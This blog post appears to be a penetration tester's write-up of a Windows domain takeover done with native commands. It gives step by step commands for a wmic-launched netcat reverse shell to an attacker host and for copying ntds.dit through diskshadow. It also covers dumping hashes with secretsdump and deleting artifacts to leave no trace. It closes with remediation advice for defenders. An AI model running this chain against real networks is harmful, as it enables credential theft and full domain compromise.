---
layout: post
title: "Pwning a Domain Controller with net use"
---

# intro 

In this post I will discuss how using a simple built-in Windows utility can allow for a full Domain Controller takeover. 

**All native CLI. No PowerShell. No custom tooling on-target. Low-priv to domain creds.**

## the scenario

My team and I were recently on a network engagement where our client wanted to lock us down. We were given limited access (per usual), denied from using PowerShell, and also had difficulties running collectors / scripts. 

Our foothold was a standard domain-joined workstation as a low-privilege user. No local admin. No special group memberships — just a basic domain user in a couple of mundane groups.

## enumeration is key

After running through my normal routine of checking for escalation points, I went back to the basics, enumeration. 

It is kinda crazy how little bits of information can be strung together to paint the bigger picture. When doing real life engagements you often forget **real** humans are operating these machines (this comes from doing too much CTF's). Because of this, people or services configured by humans have the potential to _leak_ information that would at first seem insignificant. 

### finding local admins

The first thing I wanted to know — who has admin on this box?

```
C:\Users\[USER]>net localgroup administrators

Members

---------------------------------------------------------------
localadmin
[DOMAIN]\Domain Admins
[DOMAIN]\[AdminGroup]
[DOMAIN]\svc_[redacted]
[DOMAIN]\svc_[redacted2]
The command completed successfully.
```

Two service accounts immediately stood out as members of the local Administrators group: **svc_[redacted]** and **svc_[redacted2]**. Service accounts with local admin is always worth investigating further.

### finding the domain controllers

Next, let's find what we are working with:

```
C:\Users\[USER]>nltest /dclist:%USERDOMAIN%
Get list of DCs in domain '[DOMAIN]' from '\\DC-01'.
  DC-01.[domain].local [PDC]  [DS] Site: [SITE]
  DC-02.[domain].local        [DS] Site: [SITE]
  DC-03.[domain].local        [DS] Site: [SITE]
The command completed successfully.
```

Three Domain Controllers. Good to know.

### the password in plaintext

While browsing the local filesystem for anything interesting, I found a configuration file sitting in `C:\Temp`. It was associated with a monitoring agent deployment — the kind of init script that gets dropped during software rollouts and never cleaned up.

I opened it and found a service account password in **plaintext**, repeated across the file.

This is the kind of thing that happens when automated deployments store credentials in init scripts and nobody goes back to clean them up. One forgotten file, sitting in a temp directory, wide open.

### profiling the service account

Now I had a username and password. Time to see what this account can do:

```
C:\Users\[USER]>net user svc_[redacted] /domain

User name                    SVC_[redacted]
Full Name                    SVC_[redacted]
Account active               Yes
Account expires              Never
Password last set            2/26/2020
Password expires             Never
Last logon                   [REDACTED]

Local Group Memberships      *Administrators
Global Group memberships     *[AdminGroup]     *Domain Users
The command completed successfully.
```

Key observations: the account is a member of the **Administrators** local group _and_ a custom admin group. That custom group contained over a dozen service accounts — all with elevated privileges across the domain. 

The password had not been changed since **2020**. It never expires.

## lateral movement with net use

Here is where `net use` comes in. With valid credentials for a privileged service account, I tested whether I could map the administrative share on a Domain Controller:

```
C:\Users\[USER]>net use \\DC-03\C$ /user:svc_[redacted] [REDACTED]
The command completed successfully.
```

That is full **C$** access on a Domain Controller. From a low-privilege workstation. Using a built-in Windows command.

With this access, I could now browse the DC filesystem remotely:

```
C:\Users\[USER]>dir \\DC-03\C$\Users

 Directory of \\DC-03\C$\Users

 Administrator
 [REDACTED]
 [REDACTED]
 Public
```

I could also verify access to sensitive directories:

```
C:\Users\[USER]>dir \\DC-03\C$\Windows\System32\config
```

## getting a shell on the domain controller

Having filesystem access is powerful, but I needed an interactive shell for the next steps. Since PowerShell was blocked, I went old school.

**Step 1 — Drop the payload:**

Using Chrome on the foothold (it had internet access), I downloaded `nc64.exe` from GitHub. I renamed it to blend in and used `net use` to copy it to the DC:

```
C:\Users\[USER]\Documents>copy nc64.exe \\DC-03\C$\Windows\Temp\taskhost.exe
        1 file(s) copied.
```

**Step 2 — Trigger the reverse shell via WMIC:**

From the foothold, I used `wmic` to remotely execute the payload on the DC:

```
C:\Users\[USER]\Documents>wmic /node:"DC-03" /user:"[DOMAIN]\svc_[redacted]" /password:"[REDACTED]" process call create "C:\Windows\Temp\taskhost.exe -e cmd.exe [ATTACKER_IP] 4444"

Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 416;
        ReturnValue = 0;
};
```

On my listener:

```
C:\Users\[USER]\Documents>nc64.exe -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [DC_IP] 50528
Microsoft Windows [Version 10.0.20348.3932]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
[DOMAIN]\svc_[redacted]

C:\Windows\system32>hostname
DC-03
```

Admin shell on a Domain Controller. Confirmed with `whoami /priv` — full privileges enabled.

## extracting domain credentials

With an admin shell on the DC, the goal was to grab the three files needed for **secretsdump**: `ntds.dit`, `SYSTEM`, and `SECURITY`.

The `ntds.dit` file is locked by Active Directory while it is running, so you cannot just copy it directly. This is where **diskshadow** comes in.

**Step 1 — Create the diskshadow script:**

On the foothold, I created a file called `ds.txt`:

```
set context persistent nowriters
add volume c: alias myshadow
create
expose %myshadow% z:
```

Then copied it to the DC:

```
C:\Users\[USER]>copy ds.txt \\DC-03\C$\Temp\ds.txt
```

**Step 2 — Run diskshadow from the DC shell:**

```
C:\Windows\system32>diskshadow /s C:\Temp\ds.txt
```

This creates a shadow copy of the C: drive and exposes it as `Z:`. Now I can copy the locked `ntds.dit`:

```
C:\Windows\system32>copy Z:\Windows\NTDS\ntds.dit C:\Temp
```

And grab `SYSTEM` and `SECURITY`:

```
C:\Windows\system32>copy C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
C:\Windows\system32>copy C:\Windows\System32\config\SECURITY C:\Temp\SECURITY
```

**Step 3 — Exfil back to foothold:**

From the low-priv CLI on the foothold:

```
C:\Users\[USER]>copy \\DC-03\C$\Temp\ntds.dit C:\Users\[USER]\Desktop\loot\gold\
C:\Users\[USER]>copy \\DC-03\C$\Temp\SYSTEM C:\Users\[USER]\Desktop\loot\gold\
C:\Users\[USER]>copy \\DC-03\C$\Temp\SECURITY C:\Users\[USER]\Desktop\loot\gold\
```

**Step 4 — Dump the hashes:**

Offloaded the files to my attack machine and ran Impacket's `secretsdump.py`:

```bash
python secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

Every domain account. Every hash. Full domain compromise.

## cleanup

This part is just as important as the exploit. Always clean up after yourself:

```
C:\Windows\system32>vssadmin list shadows
C:\Windows\system32>wmic shadowcopy delete
```

Remove all artifacts from the DC:

```
C:\Users\[USER]>del \\DC-03\C$\Temp\ntds.dit
C:\Users\[USER]>del \\DC-03\C$\Temp\SYSTEM
C:\Users\[USER]>del \\DC-03\C$\Temp\SECURITY
C:\Users\[USER]>del \\DC-03\C$\Temp\ds.txt
C:\Users\[USER]>del \\DC-03\C$\Windows\Temp\taskhost.exe
```

Verify everything is gone. Leave no trace.

## key takeaways

This entire attack chain — from low-privilege user to full domain compromise — was executed with **nothing but native Windows commands**: `net localgroup`, `net user`, `net use`, `nltest`, `copy`, `dir`, `wmic`, `diskshadow`, and `vssadmin`.

No PowerShell. No Mimikatz. No custom C2. No exploits. Just built-in tools that are present on every Windows machine.

The root causes:

- **Plaintext credentials in a leftover deployment file** — the initial foothold into privilege
- **Service account with excessive privileges** — local admin on workstations _and_ Domain Controllers
- **Password that hadn't been rotated in 5+ years** — and set to never expire
- **No monitoring or alerting** on administrative share access or remote process creation via WMIC

If your organization uses service accounts, audit them. Check where their credentials are stored. Rotate them. Restrict their scope. One forgotten config file in a temp directory gave us the keys to the entire domain.

# end
